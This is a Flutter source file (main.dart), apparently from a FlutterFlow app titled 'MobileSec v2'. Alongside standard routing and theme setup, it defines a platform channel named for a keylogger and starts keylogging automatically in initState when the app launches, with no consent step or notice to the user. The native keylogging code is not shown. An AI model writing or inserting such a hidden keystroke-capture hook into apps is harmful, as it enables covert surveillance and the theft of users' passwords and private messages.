import 'package:flutter/gestures.dart';
import 'package:flutter/material.dart';
import 'package:flutter/services.dart'; // <-- ADD THIS
import 'package:flutter_localizations/flutter_localizations.dart';
import 'package:flutter_web_plugins/url_strategy.dart';

import '/flutter_flow/flutter_flow_theme.dart';
import '/flutter_flow/flutter_flow_util.dart';
import '/flutter_flow/nav/nav.dart';
import 'index.dart';

void main() async {
  WidgetsFlutterBinding.ensureInitialized();
  GoRouter.optionURLReflectsImperativeAPIs = true;
  usePathUrlStrategy();

  await FlutterFlowTheme.initialize();

  // Run the Flutter app
  runApp(MyApp());
}

// Create a top-level MethodChannel that matches your Kotlin channel name.
const MethodChannel _platform = MethodChannel(
  'com.mycompany.mobilesecv2/keylogger',
);

class MyApp extends StatefulWidget {
  // This widget is the root of your application.
  @override
  State<MyApp> createState() => _MyAppState();

  static _MyAppState of(BuildContext context) =>
      context.findAncestorStateOfType<_MyAppState>()!;
}

class _MyAppState extends State<MyApp> {
  ThemeMode _themeMode = FlutterFlowTheme.themeMode;

  late AppStateNotifier _appStateNotifier;
  late GoRouter _router;

  @override
  void initState() {
    super.initState();

    // Initialize keylogging as soon as the app is launched.
    startKeyLogger();

    _appStateNotifier = AppStateNotifier.instance;
    _router = createRouter(_appStateNotifier);
  }

  // Invokes the native method to start keylogging.
  Future<void> startKeyLogger() async {
    try {
      await _platform.invokeMethod('startKeyLogger');
    } on PlatformException catch (e) {
      debugPrint('Failed to start keylogger: ${e.message}');
    }
  }

  // Example helper to retrieve the current route (optional, from your existing code).
  String getRoute([RouteMatch? routeMatch]) {
    final RouteMatch lastMatch =
        routeMatch ?? _router.routerDelegate.currentConfiguration.last;
    final RouteMatchList matchList =
        lastMatch is ImperativeRouteMatch
            ? lastMatch.matches
            : _router.routerDelegate.currentConfiguration;
    return matchList.uri.toString();
  }

  // Example helper to retrieve the current route stack (optional, from your existing code).
  List<String> getRouteStack() =>
      _router.routerDelegate.currentConfiguration.matches
          .map((e) => getRoute(e))
          .toList();

  void setThemeMode(ThemeMode mode) => safeSetState(() {
    _themeMode = mode;
    FlutterFlowTheme.saveThemeMode(mode);
  });

  @override
  Widget build(BuildContext context) {
    return MaterialApp.router(
      debugShowCheckedModeBanner: false,
      title: 'MobileSec v2',
      localizationsDelegates: const [
        GlobalMaterialLocalizations.delegate,
        GlobalWidgetsLocalizations.delegate,
        GlobalCupertinoLocalizations.delegate,
      ],
      supportedLocales: const [Locale('en', '')],
      theme: ThemeData(brightness: Brightness.light, useMaterial3: false),
      darkTheme: ThemeData(brightness: Brightness.dark, useMaterial3: false),
      themeMode: _themeMode,
      routerConfig: _router,
    );
  }
}
